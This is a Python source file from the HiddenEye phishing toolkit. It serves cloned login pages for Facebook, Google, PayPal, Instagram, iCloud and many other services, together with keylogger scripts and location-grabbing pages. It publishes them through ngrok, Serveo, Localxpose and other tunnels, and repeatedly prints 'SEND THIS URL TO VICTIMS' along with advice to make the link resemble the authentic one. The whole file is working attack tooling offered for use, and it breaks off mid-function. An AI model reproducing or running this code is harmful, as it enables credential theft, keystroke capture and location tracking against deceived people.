# Any actions must be here

import getpass
import base64
from os import system, path
from distutils.dir_util import copy_tree
from time import sleep
import re
import json
from urllib.request import urlopen
from subprocess import check_output, CalledProcessError
from sys import stdout, argv, exit
from Defs.ThemesManager import colorSelector
from Defs.Configurations import readConfig, ifSettingsNotExists
from Defs.Languages import *


installGetText()
languageSelector()
ifSettingsNotExists()
config = readConfig()

logFile = None
didBackground = config.get("Settings", "DidBackground")
for arg in argv:
    if arg == "--nolog":  # If true - don't log
        didBackground = False
if config.get("Settings", "DidBackground") == "True":
    logFile = open("log.txt", "w")

colorTheme = colorSelector()
MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
    1], colorTheme[2], colorTheme[3],  colorTheme[4]


def runPhishing(page, customOption):  # Phishing pages selection menu
    system('rm -r Server/www/ && mkdir Server/www && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/ && rm -rf link.url')
    if customOption == '1' and page == 'Facebook':
        copy_tree("WebPages/fb_standard/", "Server/www/")
    elif customOption == '2' and page == 'Facebook':
        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
    elif customOption == '3' and page == 'Facebook':
        copy_tree("WebPages/fb_security_fake/", "Server/www/")
    elif customOption == '4' and page == 'Facebook':
        copy_tree("WebPages/fb_messenger/", "Server/www/")
    elif customOption == '1' and page == 'Google':
        copy_tree("WebPages/google_standard/", "Server/www/")
    elif customOption == '2' and page == 'Google':
        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
    elif customOption == '3' and page == 'Google':
        copy_tree("WebPages/google_advanced_web/", "Server/www/")
    elif page == 'LinkedIn':
        copy_tree("WebPages/linkedin/", "Server/www/")
    elif page == 'GitHub':
        copy_tree("WebPages/GitHub/", "Server/www/")
    elif page == 'StackOverflow':
        copy_tree("WebPages/stackoverflow/", "Server/www/")
    elif page == 'WordPress':
        copy_tree("WebPages/wordpress/", "Server/www/")
    elif page == 'Twitter':
        copy_tree("WebPages/twitter/", "Server/www/")
    elif page == 'Snapchat':
        copy_tree("WebPages/Snapchat_web/", "Server/www/")
    elif page == 'Yahoo':
        copy_tree("WebPages/yahoo_web/", "Server/www/")
    elif page == 'Twitch':
        copy_tree("WebPages/twitch/", "Server/www/")
    elif page == 'Microsoft':
        copy_tree("WebPages/live_web/", "Server/www/")
    elif page == 'Steam':
        copy_tree("WebPages/steam/", "Server/www/")
    elif page == 'iCloud':
        copy_tree("WebPages/iCloud/", "Server/www/")
    elif customOption == '1' and page == 'Instagram':
        copy_tree("WebPages/Instagram_web/", "Server/www/")
    elif customOption == '2' and page == 'Instagram':
        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
    elif customOption == '3' and page == 'Instagram':
        copy_tree("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif customOption == '4' and page == 'Instagram':
        copy_tree("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif customOption == '5' and page == 'Instagram':
        copy_tree("WebPages/instafollowers/", "Server/www/")
    elif customOption == '1' and page == 'VK':
        copy_tree("WebPages/VK/", "Server/www/")
    elif customOption == '2' and page == 'VK':
        copy_tree("WebPages/VK_poll_method/", "Server/www/")
    elif page == 'GitLab':
        copy_tree("WebPages/gitlab/", "Server/www/")
    elif page == 'NetFlix':
        copy_tree("WebPages/netflix/", "Server/www/")
    elif page == 'Origin':
        copy_tree("WebPages/origin/", "Server/www/")
    elif page == 'Pinterest':
        copy_tree("WebPages/pinterest/", "Server/www/")
    elif page == 'ProtonMail':
        copy_tree("WebPages/protonmail/", "Server/www/")
    elif page == 'Spotify':
        copy_tree("WebPages/spotify/", "Server/www/")
    elif page == 'Quora':
        copy_tree("WebPages/quora/", "Server/www/")
    elif page == 'PornHub':
        copy_tree("WebPages/pornhub/", "Server/www/")
    elif page == 'Adobe':
        copy_tree("WebPages/adobe/", "Server/www/")
    elif page == 'Badoo':
        copy_tree("WebPages/badoo/", "Server/www/")
    elif page == 'CryptoCurrency':
        copy_tree("WebPages/cryptocurrency/", "Server/www/")
    elif page == 'DevianArt':
        copy_tree("WebPages/devianart/", "Server/www/")
    elif page == 'DropBox':
        copy_tree("WebPages/dropbox/", "Server/www/")
    elif page == 'eBay':
        copy_tree("WebPages/ebay/", "Server/www/")
    elif page == 'Myspace':
        copy_tree("WebPages/myspace/", "Server/www/")
    elif page == 'PayPal':
        copy_tree("WebPages/paypal/", "Server/www/")
    elif page == 'Shopify':
        copy_tree("WebPages/shopify/", "Server/www/")
    elif page == 'Verizon':
        copy_tree("WebPages/verizon/", "Server/www/")
    elif page == 'Yandex':
        copy_tree("WebPages/yandex/", "Server/www/")
    elif customOption == '1' and page == 'Reddit':
        copy_tree("WebPages/Reddit/", "Server/www/")
    elif customOption == '2' and page == 'Reddit':
        copy_tree("WebPages/Reddit-old/", "Server/www/")
    elif page == 'Subitoit':
        copy_tree("WebPages/subitoit/", "Server/www/")
    elif page == 'PlayStation':
        copy_tree('WebPages/playstation/', "Server/www/")
    elif page == 'Xbox':
        copy_tree('WebPages/xbox/', "Server/www/")
    elif page == 'CUSTOM(1)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(MAIN0, MAIN4))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(MAIN0, MAIN4))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
        sleep(3)
        copy_tree('WebPages/CUSTOM(1)/', "Server/www/")
    elif page == 'CUSTOM(2)':
        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(MAIN0, MAIN4))
        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(MAIN0, MAIN4))
        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
        sleep(3)
        copy_tree('WebPages/CUSTOM(2)/', "Server/www/")
    

    # Tools Below && Phishing Pages Above
    elif customOption == '1' and page == 'LOCATION':
        sleep(3)
        copy_tree('WebPages/TOOLS/nearyou', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n".format(MAIN0, MAIN4))
        input('\nPress Enter To continue...')
    elif customOption == '2' and page == 'LOCATION':
        sleep(3)
        copy_tree('WebPages/TOOLS/gdrive', "Server/www/")
        print("\n\n{0}[{1}*{0}]{1} PLEASE USE TUNNELS/URL WITH '{0}https{1}' \n{0}[{1}*{0}]{1} Browsers Trusts only Https Links To Share Location\n{0}[{1}*{0}]{1} {0}Tip: {1}Use Google Drive File Url as Custom Url while asked.".format(MAIN0, MAIN4))
        input('\nPress Enter To continue...')

    else:
        endMessage(port)


def selectPort():  # Question where user must select port
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    try:
        if (int(choice) > 65535 or int(choice) < 1):
            return selectPort()
        else:
            return choice
    except:
        return selectPort()


def selectServer(port):  # Question where user must select server
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print(
        "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))

    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    if choice == '0':
        system('clear')
        runLocalhost(port)
    elif choice == '1':
        system('clear')
        runNgrok(port)
    elif choice == '2':
        system('clear')
        runServeo(port)
    elif choice == '3':
        system('clear')
        runLocalxpose(port)
    elif choice == '4':
        system('clear')
        runLT(port, True)
    elif choice == '5':
        system('clear')
        runLT(port, False)
    elif choice == '6':
        system('clear')
        runOpenport(port)
    elif choice == '7':
        system('clear')
        runPagekite(port)
    else:
        system('clear')
        return selectServer(port)

def runLocalhost(port):
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
    system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
    print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
    sleep(2)
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RUNNING LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(MAIN0, MAIN2, MAIN3, port, host))
    print("\n")

def runPagekite(port):
	system('clear')
	print('''
		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
		{0}http://github.com/darksecdevelopers
		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
	if 256 == system('which python2 > /dev/null'):
		print('[*] Python2 not Installed, Pagekite Only Supports Python2!!')
		input('\n Press Enter To Try installing Python2 Now..')
		system('apt install python2')
		if 256 == system('which python2 > /dev/null'):
			system('clear')
			print("\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(MAIN0, MAIN4))
			sleep(2)
			selectServer(port)
		else:
			pass	
	else:
		try:
			subdomain = input("\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
			print("\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
			print("\n{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
			print("\n{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
			print("\n{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
			input("\n\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
			system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
			system("cd Server/www/ && php -S localhost:%s > /dev/null 2>&1 &" % (port))
			system('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
		except:
			print('[*] Unable To get Tunnel..Going Back')
			sleep(3)				
			
def runOpenport(port):
	system('clear')
	print('''
		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
		{0}http://github.com/darksecdevelopers
		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
	if 256 == system('which openport > /dev/null'):
		system('clear')
		print('[*] Openport not Installed correctly, Try installing it manually !!')
		print('[*] Check Here ... https://openport.io/download')
		input('\n Press Enter To Go back..')
		selectServer(port)
	else:
		manageOpenporturl(port)

def manageOpenporturl(port): # Its all about How we generate a url from openport, & How we used grep & curl to get a url to shown on final panel of script.
	print("\n{0}[{1}*{0}] {0}Please Be Calm , We are Working To get a Openport URL For You.{1}".format(MAIN0, MAIN4))
	sleep(2)
	system('rm filename.txt')
	try:
		system('openport -K && openport %s > openport.txt &' % (port)) # Running openport server and putting the process in background using (&) and writing the output to a txt file.
		print('[*] Openport Server Running in Background.. Please wait.')
		sleep(20) # Sleep time is important as the openport command takes some time to give response link.
		system('cat openport.txt | grep https://spr.openport.io/l/...................... -oh > urltoverify.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
		print('[*] Getting the verification link of openurl tunnel.')
		with open('urltoverify.txt') as f:
			read_data = f.read()
			if 'https://spr.openport.io/l/' in read_data:
				print('[*] In case Error Occured Visit Below Link to Get your Tunnel Link')
				pass
			else:
				print('[^] Unable To Got Openport Link. ')
				print('[*] You Have Reached Maximum Free Tunnels or (Server Down).')
				print('[*] Trying Again..')
				sleep(7)
				runOpenport(port)
		
		urlFile = open('urltoverify.txt', 'r')
		urltoverify = urlFile.read().strip()
		print('{0}[{1}*{0}] {1}Got A Verification Link:{0} '.format(MAIN0, MAIN4))

		
		# Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
		system('touch filename.txt')
		with open('filename.txt', 'r') as f:
			read_data = f.read()
		c = read_data.replace('', ' -o urlindex.txt')
		f = open('filename.txt', 'w')
		f.write(c)
		f.close()
		with open('filename.txt', 'r') as f:
			filename = f.read()
		urltoverify = urltoverify+filename	
		print('\n\n[*] Requesting Server to Get the working Url For Tunnel.')
		system('curl {0}'.format(urltoverify)) # Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
		sleep(5)
		
		# From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
		print('\n[*] Index File of response Saved.')
		sleep(8)
		print('[*] Finding Original Url From index File.')
		system('rm filename.txt && touch filename.txt')
		with open('filename.txt', 'r') as f:
			read_data = f.read()
		c = read_data.replace('', ' | grep http://spr.openport.io:..... -oh > mixedurl.txt')
		f = open('filename.txt', 'w')
		f.write(c)
		f.close()
		with open('filename.txt', 'r') as f:
			filename = f.read().strip()
		system('cat urlindex.txt {0}'.format(filename)) # From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
		

		system('rm filename.txt && touch filename.txt')
		with open('filename.txt', 'r') as f:
			read_data = f.read()
		c = read_data.replace('', ' > openporturl.txt')
		f = open('filename.txt', 'w')
		f.write(c)
		f.close()
		with open('filename.txt', 'r') as f:
			filename = f.read().strip()
		sleep(6)
		print('[*] Removing The Duplicates Of Original Url.')
		system('sort +2 -u mixedurl.txt {0}'.format(filename)) # It will remove the duplicate and make it single url.
		urlFile = open('openporturl.txt', 'r')
		url = urlFile.read()
		sleep(3)
		print('[*] We Got The URL :{0}'.format(url))
		sleep(15)
		

		system('rm urltoverify.txt && rm mixedurl.txt && rm urlindex.txt && rm openport.txt') # To remove all the above used txt files.
		system('clear')
		print('''
	        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
	        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
	        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
	        {0}http://github.com/darksecdevelopers
	        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
		print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
		print("\n")
	except:
		input('\n\n[*] Failed To Get URL.. Press Enter To Go Back.')
		sleep(2)
		selectServer(port)

def runNgrok(port):
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))

    system('./Server/ngrok http {} > /dev/null &'.format(port))
    while True:
        sleep(2)
        system(
            'curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
        urlFile = open('link.url', 'r')
        url = urlFile.read()
        urlFile.close()
        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
            print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
                MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
            print("\n")
            break


def runLocalxpose(port):
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n'''.format(MAIN0, MAIN2))
    print("\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
    system('clear')
    if choice == '1':

        customLocalxpose(port)
    elif choice == '2':
        randomLocalxpose(port)
    else:
        system('clear')
        return runLocalxpose(port)


def customLocalxpose(port):

    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)'''.format(MAIN0, MAIN2))
    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
    system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
    sleep(7)
    try:
        output = check_output(
            "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")

    except CalledProcessError:
        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
'''.format(MAIN0, MAIN4))
        sleep(4)
        system('clear')
        return customLocalxpose(port)


def randomLocalxpose(port):
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
    sleep(8)
    try:
        output = check_output(
            "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
        url = output.decode('utf-8')
        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
            MAIN0, MAIN4, MAIN3, port, url) + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")
    except CalledProcessError:

        sleep(4)
        system('clear')
        return randomLocalxpose(port)


def runServeo(port):
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(MAIN0, MAIN2))
    print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
    system('clear')
    if choice == '1':

        customServeo(port)
    elif choice == '2':
        randomServeo(port)
    else:
        system('clear')
        return runServeo(port)


def customServeo(port):

    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo'''.format(MAIN0, MAIN2))
    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
    if not ".serveo.net" in lnk:
        lnk += ".serveo.net"
    else:
        pass
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R %s:80:localhost:%s serveo.net > link.url 2> /dev/null &' % (lnk, port))
    sleep(7)
    try:
        output = check_output(
            "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")

    except CalledProcessError:
        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
'''.format(MAIN0, MAIN4))
        sleep(4)
        system('clear')
        return customServeo(port)


def randomServeo(port):
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
    sleep(8)
    try:
        output = check_output(
            "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
        url = output.decode("utf-8")
        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
            MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
        print("\n")
    except CalledProcessError:

        sleep(4)
        system('clear')
        return randomServeo(port)


def runLT(port, npm):
    system('clear')
    print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
    print(
        "\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
    print("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL".format(MAIN0, MAIN2))
    s = input('\n{0}(Localtunnel/Subdomain)> {2}'.format(MAIN0, MAIN4, MAIN2))
    try:
        system('{0}lt -p '.format('' if npm else 'Server/') +
               port+((' -s '+s) if s != '' else s)+' > link.url &')
        sleep(3)
        system('clear')
        print('''
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
